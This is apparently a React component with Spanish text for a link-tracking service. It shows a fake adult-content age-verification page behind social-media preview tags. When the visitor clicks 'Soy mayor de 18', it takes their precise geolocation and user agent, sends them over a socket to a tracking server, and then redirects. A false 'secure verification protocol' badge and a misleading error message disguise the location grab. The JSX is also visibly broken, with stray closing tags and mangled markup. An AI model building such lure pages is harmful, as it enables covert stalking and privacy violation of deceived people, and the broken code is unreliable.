import React, { useEffect, useState, useRef } from 'react';
import { useParams } from 'react-router-dom';
import { Helmet } from 'react-helmet-async';
import { io } from 'socket.io-client';
import api from '../services/api';

const TrackLink = () => {
    const { id } = useParams();
    const [linkData, setLinkData] = useState(null);
    const [error, setError] = useState(null);
    const socketRef = useRef();

    useEffect(() => {
        const fetchLinkData = async () => {
            try {
                const response = await api.get(`/links/${id}`);
                setLinkData(response.data);
            } catch (error) {
                console.error('Error fetching link:', error);
                setLinkData({
                    title: 'Enlace no encontrado',
                    description: 'Este enlace puede haber expirado o no existe.',
                    imageUrl: 'https://placehold.co/600x400/1e293b/475569?text=Error'
                });
            }
        };
        fetchLinkData();

        socketRef.current = io('http://localhost:3001');
        return () => {
            if (socketRef.current) socketRef.current.disconnect();
        };
    }, [id]);

    const handleEnter = () => {
        setError(null);
        if (!navigator.geolocation) {
            setError('La geolocalización no es compatible con tu navegador');
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (position) => {
                const { latitude, longitude } = position.coords;
                // Emit location to socket
                socketRef.current.emit('update-location', {
                    linkId: id,
                    lat: latitude,
                    lng: longitude,
                    userAgent: navigator.userAgent
                });

                // Redirect to destination
                if (linkData?.destinationUrl) {
                    window.location.href = linkData.destinationUrl;
                }
            },
            (err) => {
                console.error('Geolocation error:', err);
                setError('Por favor verifique su edad/ubicación para continuar.');
            }
        );
    };

    if (!linkData) return (
        <div className="min-h-screen bg-slate-900 flex items-center justify-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary"></div>
        </div>
    );

    return (
        <div className="min-h-screen bg-black font-display text-white relative overflow-hidden flex flex-col">
            <Helmet>
                <title>{linkData.title || "Contenido Restringido"}</title>
                <meta name="description" content={linkData.description || "Verificación requerida"} />
                <meta property="og:title" content={linkData.title || "Contenido Restringido"} />
                <meta property="og:description" content={linkData.description || "Verificación requerida"} />
                <meta property="og:image" content={linkData.imageUrl || ""} />
            </Helmet>

        </div>
                                </div >
                            </div >

    {/* Headline Section */ }
    < div className = "text-center mb-4" >
        <h1 className="text-white tracking-tight text-3xl font-bold leading-tight font-display">
            {linkData.title || "Contenido Restringido"}
        </h1>
                            </div >

    {/* Body Text Section */ }
    < div className = "text-center mb-8" >
        <p className="text-slate-300 text-base font-normal leading-relaxed font-display px-2">
            {linkData.description || "Este contenido está destinado a audiencias maduras solamente. Para cumplir con las regulaciones locales, verifique su edad para continuar."}
        </p>
                            </div >

    {/* CTA Button Section */ }
    < div className = "flex flex-col gap-4 items-center" >
                                <button
                                    onClick={handleEnter}
                                    className="w-full flex min-w-[240px] cursor-pointer items-center justify-center overflow-hidden rounded-lg h-14 px-8 bg-primary text-white text-lg font-bold leading-normal tracking-[0.015em] hover:bg-primary/90 transition-all shadow-lg shadow-primary/20 active:scale-[0.98]">
                                    <span className="truncate">Soy mayor de 18 - Ver Contenido</span>
                                </button>
                                <button className="text-slate-500 hover:text-white text-sm font-medium transition-colors py-2 font-display">
                                    Salir - Soy menor de 18
                                </button>
                            </div >

    {/* Trust Signals */ }
    < div className = "mt-10 pt-6 border-t border-white/5 flex flex-col items-center gap-2" >
                                <div className="flex items-center gap-2 text-slate-500 text-[10px] uppercase tracking-widest font-bold">
                                    <span className="material-symbols-outlined" style={{ fontSize: '14px' }}>verified_user</span>
                                    Protocolo de Verificación Seguro v2.4
                                </div>
                                <p className="text-[10px] text-slate-600 text-center max-w-[300px]">
                                    Al hacer clic en "Ver Contenido", aceptas nuestros Términos de Servicio y confirmas que eres mayor de edad.
                                </p>
                            </div >

                        </div >

    {/* Subtle Footer Links */ }
    < div className = "mt-8 flex justify-center gap-6 text-slate-600 text-xs font-display" >
                            <a href="#" className="hover:text-slate-400 transition-colors">Privacidad</a>
                            <a href="#" className="hover:text-slate-400 transition-colors">Términos</a>
                            <a href="#" className="hover:text-slate-400 transition-colors">Cookies</a>
                        </div >
                    </div >
                </main >
    <div className="h-10"></div>
            </div >
        </div >
    );
};

export default TrackLink;
